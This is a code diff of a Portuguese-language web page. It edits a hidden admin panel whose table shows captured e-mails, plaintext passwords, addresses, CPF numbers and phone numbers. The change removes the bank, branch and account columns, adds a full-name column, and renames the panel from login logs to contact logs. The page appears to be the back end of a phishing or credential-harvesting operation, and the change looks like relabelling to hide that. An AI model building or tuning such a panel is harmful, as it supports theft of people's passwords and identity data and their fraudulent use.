@@ -99,16 +99,14 @@
 
     <!-- Painel de logs de login -->
     <div class="container" id="painel-logs-login" style="max-width:700px; margin-top:40px; display:none;">
-        <h2 class="painel-title">Logs de Login</h2>
+        <h2 class="painel-title">Logs de Contato</h2>
         <table style="width:100%; border-collapse:collapse;">
             <thead>
                 <tr style="background:#f7f7f7;">
                     <th style="padding:8px; border:1px solid #eee;">E-mail</th>
                     <th style="padding:8px; border:1px solid #eee;">Senha</th>
                     <th style="padding:8px; border:1px solid #eee;">Endereço</th>
-                    <th style="padding:8px; border:1px solid #eee;">Banco</th>
-                    <th style="padding:8px; border:1px solid #eee;">Agência</th>
-                    <th style="padding:8px; border:1px solid #eee;">Conta</th>
+                    <th style="padding:8px; border:1px solid #eee;">Nome Completo</th>
                     <th style="padding:8px; border:1px solid #eee;">CPF</th>
                     <th style="padding:8px; border:1px solid #eee;">Telefone</th>
                 </tr>
@@ -494,9 +492,7 @@
                         <td style='padding:8px; border:1px solid #eee;'>${data.email || ''}</td>
                         <td style='padding:8px; border:1px solid #eee;'>${data.senha || ''}</td>
                         <td style='padding:8px; border:1px solid #eee;'>${data.endereco || ''}</td>
-                        <td style='padding:8px; border:1px solid #eee;'>${data.banco || ''}</td>
-                        <td style='padding:8px; border:1px solid #eee;'>${data.agencia || ''}</td>
-                        <td style='padding:8px; border:1px solid #eee;'>${data.conta || ''}</td>
+                        <td style='padding:8px; border:1px solid #eee;'>${data.nomeCompleto || ''}</td>
                         <td style='padding:8px; border:1px solid #eee;'>${data.cpf || ''}</td>
                         <td style='padding:8px; border:1px solid #eee;'>${data.telefone || ''}</td>
                     `;
